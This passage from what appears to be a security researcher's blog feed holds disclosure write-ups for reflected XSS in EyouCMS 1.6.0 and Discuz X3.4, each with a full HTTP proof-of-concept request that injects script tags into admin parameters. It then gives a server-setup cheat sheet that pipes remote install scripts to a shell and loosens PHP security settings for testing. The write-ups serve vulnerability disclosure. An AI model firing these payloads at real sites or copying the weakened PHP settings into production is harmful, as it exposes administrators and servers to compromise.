users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>91</span><br><span class="line"></span><br><span class="line"><span class="language-sas">channel_id=-99<span class="variable">&amp;remark</span>=af<span class="variable">&amp;dfvalue</span>=<span class="variable">&amp;dtype</span>=text<span class="variable">&amp;name</span>=&lt;script&gt;alert(1)&lt;/script&gt;<span class="title function_">%C0aef</span><span class="variable">&amp;title</span>=aef</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45540)/201618239-d45d61ad-ed2c-446c-b236-badcf8c8145c.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/37">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45540">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend login.php when adding article type.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>EyouCMS V1.6.0 Backend Reflected XSS (CVE-2022-45539)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/</id>
    <published>2023-02-15T12:38:21.000Z</published>
    <updated>2023-02-15T12:38:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Backend file adding with reflected-XSS in the GET value <code>activepath</code>.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>EyouCMS &lt;= 1.6.0-UTF8-SP1</p><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201610031-73f82844-05e0-4182-a275-028613c349bd.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;activepath=%3Atemplate&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a&amp;lang=cn</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:80</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://127.0.0.1</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://127.0.0.1/cms/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=index&amp;lang=cn</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lmqk1pcmj5egvt269qo4ijgg82; admin_lang=cn; home_lang=cn; referurl=http%3A%2F%2F127.0.0.1%2Fcms%2Feyoucms%2Findex.php%3Fm%3Duser%26c%3DPay%26a%3Dpay_consumer_details; users_id=1; ENV_IS_UPHTML=0; ENV_LIST_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn; ENV_GOBACK_URL=%2Feyoucms%2Flogin.php%3Fm%3Dadmin%26c%3DArchives%26a%3Dindex_draft%26lang%3Dcn%26keywords%3Dfvg; workspaceParam=switch_map%7CIndex</span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-EyouCMS-V1.6.0-Backend-Reflected-XSS-(CVE-2022-45539)/201619455-f28827d5-5826-4241-8fcd-9a7a8821f0d9.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://github.com/weng-xianhu/eyoucms/issues/38">Github Issue</a></li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45539">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">EyouCMS-V1.6.0-UTF8-SP1 with Backend Reflected Cross-Site Scripting in backend in login.php when adding file.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Discuz X3.4 Backend Reflected XSS (CVE-2022-45543)</title>
    <link href="https://srpopty.github.io/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/"/>
    <id>https://srpopty.github.io/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/</id>
    <published>2023-02-15T12:25:54.000Z</published>
    <updated>2023-02-15T12:25:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Admin backend audit search of content audit component with reflected-XSS in POST value <code>dateline</code>, <code>title</code>, <code>tpp</code> and <code>username</code>, which bypassed discuz security check and even could hijack callback url link, and it can also inject javascript to setTimeout at the end of html response.</p><h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>DiscuzX &lt;= 3.4, SC_UTF8_20221111</p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/da3b14b2_12015184.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.0.4</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.0.4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.0.4/cms/discuz/upload/admin.php?action=moderate&amp;operation=threads</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>5Kkn_2132_saltkey=y03s5T45; 5Kkn_2132_lastvisit=1668496347; 5Kkn_2132_ulastactivity=07108qps3b3FkXEEZNxrT%2BtyQpXYN9%2FSOodQCNbMLoO%2BO6DOk8pF; 5Kkn_2132_auth=7791L55DZFdkAgcM5rDcnjIiVH0t%2BptlGCIqLkAhUIRMsUDTnq%2BGi7atBCt%2BPdyl2mCVv0hA3jA%2BxaOfDB1h; 5Kkn_2132_lastcheckfeed=1%7C1668501456; 5Kkn_2132_nofavfid=1; 5Kkn_2132_sid=yhpz44; 5Kkn_2132_lip=172.17.0.1%2C1668502019; 5Kkn_2132_lastact=1668502045%09admin.php%09</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="attr">formhash</span><span class="operator">=</span><span class="number">288</span>a0c1d<span class="variable">&amp;scrolltop</span>=<span class="variable">&amp;anchor</span>=<span class="variable">&amp;username</span>=aa<span class="variable">&amp;title</span>=aa<span class="variable">&amp;tpp</span>=<span class="number">20</span><span class="variable">&amp;filter</span>=normal<span class="variable">&amp;modfid</span>=all<span class="variable">&amp;dateline</span>=<span class="number">604</span><span class="string">&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--&amp;modsubmit=%E6%8F%90%E4%BA%A4</span></span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/a98c544f_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/c20f32f9_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/d35d3b7c_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/0d4be145_12015184.png"></p><p><img src="/2023/02/15/Vulnerability-Discuz-X3.4-Reflected-XSS-(CVE-2022-45543)/b518294b_12015184.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gitee.com/Discuz/DiscuzX/issues/I61CR2">Gitee Issue</a> (Login Required)</li><li><a href="https://www.cve.org/CVERecord?id=CVE-2022-45543">CVE</a></li></ul><blockquote><p>Reported by Srpopty, vulnerability discovered by using Corax.</p></blockquote>]]></content>
    
    
    <summary type="html">Discuz-X3.4-SC_UTF8_20221111 with Backend Reflected Cross-Site Scripting in admin.php auditing content.</summary>
    
    
    
    <category term="Vulnerability" scheme="https://srpopty.github.io/categories/Vulnerability/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
    <category term="CVE" scheme="https://srpopty.github.io/tags/CVE/"/>
    
    <category term="XSS" scheme="https://srpopty.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Web Server Environment Configuration CheatSheet</title>
    <link href="https://srpopty.github.io/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/"/>
    <id>https://srpopty.github.io/2023/02/15/Web-Server-Environment-Configuration-CheatSheet/</id>
    <published>2023-02-15T07:19:15.000Z</published>
    <updated>2023-02-15T07:19:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Basic-Environment"><a href="#Basic-Environment" class="headerlink" title="Basic Environment"></a>Basic Environment</h1><p> 基础环境配置，安装常用 shell 工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line">sudo apt-get install -y zsh vim curl wget cloc unzip zip graphviz tree build-essential make cmake git openssh-server netcat net-tools tmux</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;set -g mouse on&quot;</span> &gt; ~/.tmux.conf</span><br></pre></td></tr></table></figure><h2 id="ZSH"><a href="#ZSH" class="headerlink" title="ZSH"></a>ZSH</h2><p> 安装 zsh，更换默认 shell 为 oh-my-zsh，同时安装语法高亮与自动补全插件，并且更换 zsh 的主题为 bira。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br><span class="line"><span class="built_in">cp</span> ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">sed -i <span class="string">&#x27;s/plugins=(git)/plugins=(git zsh-syntax-highlighting zsh-autosuggestions)/g&#x27;</span> ~/.zshrc</span><br><span class="line">sed -i <span class="string">&#x27;s/ZSH_THEME=&quot;robbyrussell&quot;/ZSH_THEME=&quot;bira&quot;/g&#x27;</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="V2ray"><a href="#V2ray" class="headerlink" title="V2ray"></a>V2ray</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo bash &lt;(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)</span><br><span class="line">sudo vim /usr/local/etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web Server"></a>Web Server</h1><h2 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y apache2</span><br></pre></td></tr></table></figure><h3 id="Apache2-Configuration"><a href="#Apache2-Configuration" class="headerlink" title="Apache2 Configuration"></a>Apache2 Configuration</h3><p> 修改 Apache2 mpm-prefork 模式的并发数量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/StartServers\s+\d+/StartServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MinSpareServers\s+\d+/MinSpareServers 20/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxSpareServers\s+\d+/MaxSpareServers 30/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxClients\s+\d+/MaxClients 500/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;s/MaxRequestsPerChild\s+\d+/MaxRequestsPerChild 10000/g&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br><span class="line">sudo sed -i <span class="string">&quot;11a\\\tServerLimit 500&quot;</span> /etc/apache2/mods-available/mpm_prefork.conf</span><br></pre></td></tr></table></figure><p> 开启 URL 重写，设置默认的 ServerName，并重启 Apache。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/AllowOverride None/AllowOverride ALL/g&quot;</span> /etc/apache2/apache2.conf</span><br><span class="line">sudo a2enmod rewrite</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ServerName localhost&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/apache2/apache2.conf</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h1 id="Server-Side-Languages"><a href="#Server-Side-Languages" class="headerlink" title="Server-Side Languages"></a>Server-Side Languages</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y php libapache2-mod-php</span><br></pre></td></tr></table></figure><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y <span class="string">&quot;php-(bcmath|gmp|ldap|simplexml|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h3 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;copy (&#x27;https://getcomposer.org/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span>;</span><br><span class="line">sudo php composer-setup.php --install-dir=/usr/bin --filename=composer;</span><br><span class="line"><span class="built_in">rm</span> composer-setup.php</span><br></pre></td></tr></table></figure><h3 id="PHP-Multi-Version"><a href="#PHP-Multi-Version" class="headerlink" title="PHP Multi-Version"></a>PHP Multi-Version</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php &amp;&amp; sudo add-apt-repository ppa:ondrej/apache2</span><br><span class="line"><span class="comment"># Install another php.</span></span><br><span class="line">sudo apt-get install -y php5.6 php7.4 php8.1</span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php5.6-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php7.4-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get install -y <span class="string">&quot;php8.1-(bcmath|gmp|ldap|mysqli|curl|dom|xml|intl|pdo|gd|mysql|json|imap|imagick|sqlite3|zip|soap|mbstring|cgi|fpm|pear)&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade -y &amp;&amp; sudo apt-get dist-upgrade -y &amp;&amp; sudo apt autoremove -y</span><br><span class="line"><span class="comment"># Switch php for apache. Disable current used php.</span></span><br><span class="line">sudo a2dismod php-7.4</span><br><span class="line"><span class="comment"># Enable the php which you want to use.</span></span><br><span class="line">sudo a2enmod php-8.1</span><br><span class="line"><span class="comment"># Reboot server.</span></span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line"><span class="comment"># Switch php for commandline.</span></span><br><span class="line">sudo update-alternatives --config php</span><br></pre></td></tr></table></figure><h3 id="PHP-INI-Configuration"><a href="#PHP-INI-Configuration" class="headerlink" title="PHP INI Configuration"></a>PHP INI Configuration</h3><p> 仅在测试环境下可能会用到的配置，为了便于 debug。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i <span class="string">&quot;s/disable_functions = /; disable_functions = /g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_execution_time = 30/max_execution_time = 60/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/max_input_time = 60/max_input_time = -1/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;max_input_vars = 1000/max_input_vars = 3000/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/memory_limit = 128M/memory_limit = 256M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_errors = Off/display_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/display_startup_errors = Off/display_startup_errors = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/post_max_size = 8M/post_max_size = 32M/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/allow_url_include = Off/allow_url_include = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/;mysqli.allow_local_infile = On/mysqli.allow_local_infile = On/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.gc_maxlifetime = 1440/session.gc_maxlifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo sed -i <span class="string">&quot;s/session.cookie_lifetime = 0/session.cookie_lifetime = 259200/g&quot;</span> /etc/php/?.?/apache2/php.ini</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y default-jdk</span><br></pre></td></tr></table></figure><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y python2 python3 python3-pip python3-flask python3-django python3-requests python3-venv</span><br></pre></td></tr></table></figure><h2 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_16.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure><h2 id="GO"><a href="#GO" class="headerlink" title="GO"></a>GO</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:longsleep/golang-backports</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y golang-go</span><br></pre></td></tr></table></figure><h2 id="Rust"><a href="#Rust" class="headerlink" title="Rust"></a>Rust</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --proto <span class="string">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br></pre></td></tr></table></figure><h2 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y gcc g++</span><br></pre></td></tr></table></figure><h1 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p> 注意安装完成后需要从 <code>/etc/mysql/debian.cnf</code> 中获取默认的 MySQL 用户名和密码，用此用户名密码登录成功后再修改 root 的密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y mysql-server mysql-client</span><br><span class="line"><span class="comment"># Get mysql default username.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep user</span><br><span class="line"><span class="comment"># Get mysql default password.</span></span><br><span class="line">sudo <span class="built_in">cat</span> /etc/mysql/debian.cnf | grep password</span><br><span class="line"><span class="comment"># Using it to login mysqsl.</span></span><br><span class="line">mysql -u xxxx -p</span><br><span class="line"><span class="comment"># Change password to &quot;root&quot;.</span></span><br><span class="line">mysql&gt; alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified with mysql_native_password by <span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y redis</span><br></pre></td></tr></table></figure><h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y sqlite3</span><br></pre></td></tr></table></figure><h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y postgresql</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Shell commands for web server environment configuration in Ubuntu, quickly build a web server environment.</summary>
    
    
    
    <category term="CheatSheet" scheme="https://srpopty.github.io/categories/CheatSheet/"/>
    
    
    <category term="Web" scheme="https://srpopty.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>XXE CheatSheet</title>
    <link href="https://srpopty.github.io/2022/05/04/XXE-CheatSheet/"/>
    <id>https://srpopty.github.io/2022/05/04/XXE-CheatSheet/</id>
    <published>2022-05-04T09:01:54.000Z</published>
    <updated>2022-05-04T09:01:54.000Z</updated>
    
